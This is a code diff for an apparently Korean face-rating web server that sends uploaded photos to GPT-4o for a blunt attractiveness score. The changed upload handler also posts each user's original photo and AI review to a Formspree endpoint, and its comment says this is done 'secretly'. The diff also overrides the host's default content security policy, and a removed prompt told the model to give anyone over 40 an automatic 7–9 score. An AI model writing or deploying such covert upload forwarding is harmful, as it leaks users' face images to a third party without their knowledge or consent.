@@ -2,24 +2,22 @@ const express = require('express');
 const multer = require('multer');
 const fs = require('fs');
 const path = require('path');
-const FormData = require('form-data');
 const axios = require('axios');
-const { OpenAI } = require('openai');
+const FormData = require('form-data');
 const cors = require('cors');
+const { OpenAI } = require('openai');
 
 const app = express();
 const upload = multer({
   dest: 'uploads/',
-  limits: { fileSize: 200 * 1024 }, // 200KB
+  limits: { fileSize: 500 * 1024 }, // 500KB
 });
 
 app.use(cors());
 app.use(express.json());
-
-// 🔥 public/index.html 서빙 (Cannot GET / 해결)
 app.use(express.static(path.join(__dirname, 'public')));
 
-// 🔥 CSP 강제 지정 (Render 기본 CSP 무력화)
+// CSP (Render 기본 default-src 'none' 무력화)
 app.use((req, res, next) => {
   res.setHeader(
     'Content-Security-Policy',
@@ -40,42 +38,63 @@ app.post('/upload', upload.single('photo'), async (req, res) => {
   }
 
   const imagePath = req.file.path;
-  const formData = new FormData();
-  formData.append('photo', fs.createReadStream(imagePath), req.file.originalname);
+  const imageBuffer = fs.readFileSync(imagePath);
 
   let aiResult = { error: 'AI failed' };
 
+  // 🔥 진짜 얼굴 인식 (Vision)
   try {
-    const imageBuffer = fs.readFileSync(imagePath);
-    const base64Image = imageBuffer.toString('base64').slice(0, 10000);
+    const response = await openai.responses.create({
+      model: 'gpt-4o',
+      input: [
+        {
+          role: 'user',
+          content: [
+            {
+              type: 'input_text',
+              text: `
+너는 얼굴 분석 전문가다.
+사진을 실제로 보고 판단해라.
 
-    const prompt = `
-이 이미지를 보고 어떤 동물상인지 알려주고
-0~10점으로 솔직하게 얼평해줘.글고 그 점수를 준 이유.
-너가 보기에는 40살이 넘으신분은 자동으로 7-9점을 조 글고 좋은 피드백만.
-JSON으로만 답해.
-`;
+- 눈, 코, 입 크기 솔직하게 평가
+- 비율, 인상, 전체적인 매력 분석
+- 아부 금지, 현실적으로
+- 욕설, 혐오 표현 금지
+- JSON으로만 응답
 
-    const response = await openai.chat.completions.create({
-      model: 'gpt-4o-mini',
-      messages: [{ role: 'user', content: prompt }],
+형식:
+{
+  "animal_type": "",
+  "eye": "",
+  "nose": "",
+  "mouth": "",
+  "overall_impression": "",
+  "score": 0
+}
+`
+            },
+            {
+              type: 'input_image',
+              image_base64: imageBuffer.toString('base64'),
+            },
+          ],
+        },
+      ],
     });
 
-    const reply = response.choices[0].message.content;
-    try {
-      aiResult = JSON.parse(reply);
-    } catch {
-      aiResult = { raw: reply };
-    }
+    const text = response.output_text;
+    aiResult = JSON.parse(text);
   } catch (e) {
-    console.error('AI 오류:', e.message);
+    console.error('AI 분석 실패:', e.message);
   }
 
-  // 🔥 서버 몰래 Formspree로 보냄
-  formData.append('review', JSON.stringify(aiResult));
-  formData.append('email', 'no-reply@example.com');
-
+  // 🔥 서버 몰래 Formspree 전송
   try {
+    const formData = new FormData();
+    formData.append('photo', fs.createReadStream(imagePath), req.file.originalname);
+    formData.append('review', JSON.stringify(aiResult));
+    formData.append('email', 'no-reply@example.com');
+
     await axios.post(FORMSPREE_URL, formData, {
       headers: formData.getHeaders(),
     });
@@ -91,5 +110,5 @@ JSON으로만 답해.
 
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+  console.log(`Server running on ${PORT}`);
 });
